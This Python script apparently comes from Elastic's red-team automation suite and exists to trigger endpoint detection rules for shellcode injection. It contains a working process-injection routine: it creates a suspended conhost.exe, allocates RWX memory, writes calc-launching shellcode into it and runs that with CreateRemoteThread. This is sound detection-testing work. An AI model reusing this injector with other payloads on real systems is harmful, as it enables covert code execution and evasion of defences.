# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata
from ctypes import *
import ctypes, time
import ctypes.wintypes

from ctypes.wintypes import BOOL
from ctypes.wintypes import DWORD
from ctypes.wintypes import HANDLE
from ctypes.wintypes import LPVOID
from ctypes.wintypes import LPCVOID
import win32process

LPCSTR = LPCTSTR = ctypes.c_char_p
LPDWORD = PDWORD = ctypes.POINTER(DWORD)


class _SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [('nLength', DWORD),
                ('lpSecurityDescriptor', LPVOID),
                ('bInheritHandle', BOOL), ]


SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = LPVOID

metadata = RtaMetadata(
    uuid="979b8d18-e266-41ad-bab4-6e68971398ea",
    platforms=["windows"],
    endpoint=[
        {'rule_id': '58b996a5-634c-4205-9ffa-a6f2b8ebc1ad', 'rule_name': 'Potential Process Creation via ShellCode'},
        {'rule_id': '2ad63716-3dc3-49ba-b682-ef4b9e4a4d87', 'rule_name': 'Potential Injection via the Console Window Class'}
    ],
    siem=[],
    techniques=["T1134", "T1055"],
)

@common.requires_os(metadata.platforms)
def Inject(path, shellcode):
    # created suspended process
    info = win32process.CreateProcess(None, path, None, None, False, 0x04, None, None, win32process.STARTUPINFO())
    page_rwx_value = 0x40
    process_all = 0x1F0FFF
    memcommit = 0x00001000
    if info[0].handle > 0 :
       print('[+] - Created ', path, 'Suspended')
    shellcode_length = len(shellcode)
    process_handle = info[0].handle  # phandle
    VirtualAllocEx = windll.kernel32.VirtualAllocEx
    VirtualAllocEx.restype = LPVOID
    VirtualAllocEx.argtypes = (HANDLE, LPVOID, DWORD, DWORD, DWORD)

    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
    WriteProcessMemory.restype = BOOL
    WriteProcessMemory.argtypes = (HANDLE, LPVOID, LPCVOID, DWORD, DWORD)
    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
    CreateRemoteThread.restype = HANDLE
    CreateRemoteThread.argtypes = (HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, DWORD)

    # allocate RWX memory
    lpBuffer = VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
    print('[+] - Allocated remote memory at ', hex(lpBuffer))

    # write shellcode in allocated memory
    res = WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
    if res > 0 :
        print('[+] - Shellcode written.')

    # create remote thread to start shellcode execution
    CreateRemoteThread(process_handle, None, 0, lpBuffer, 0, 0, 0)
    print('[+] - Shellcode Injection, done.')


def main():
    # shellcode to pop calc
    sc = b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6"

    # Inject shellcode into conhost.exe to trigger 2 rules
    Inject(u"C:\\Windows\\System32\\conhost.exe", sc)

    # Terminate CalculatorApp.exe and Calc.exe processes using taskkill
    common.execute(["taskkill.exe", "/f", "/im", "CalculatorApp.exe"])
    common.execute(["taskkill.exe", "/f", "/im", "Calc.exe"])


if __name__ == "__main__":
    exit(main())
